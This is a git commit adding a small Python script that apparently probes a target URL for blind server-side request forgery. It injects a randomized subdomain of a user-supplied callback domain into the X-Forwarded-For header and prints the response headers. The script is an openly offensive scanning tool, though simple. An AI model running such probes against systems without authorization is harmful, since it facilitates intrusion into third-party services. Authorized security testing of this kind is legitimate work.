93fa9dde43d0ee56b358c6c7fd55ccb54b187bd6
Ashish Kunwar <dorkerdevil280@gmail.com>
2021-09-16 00:20:31 +0530

    Add files via upload

---
+++ random_ssrf.py
@@ -0,0 +1,27 @@
+import requests
+import sys
+import string
+import random
+import logging
+logging.basicConfig(level=logging.DEBUG)
+from requests.packages import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+S = 10
+def main():
+    target = sys.argv[1]
+    ssrf_baby = sys.argv[2]
+    endpoint = sys.argv[3]
+    if len(sys.argv) >= 3:
+        try:
+            makeup = target+endpoint
+            collaborator = ssrf_baby
+            ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = S))
+            collab = str(ran)+'.'+collaborator
+            target_headers = {"X-Forwarded-For": collab}
+            r = requests.get(makeup, headers=target_headers)
+            print (r.headers)
+        except Exception as error:
+            print ("something went wrong")
+if __name__ == '__main__':
+    main()
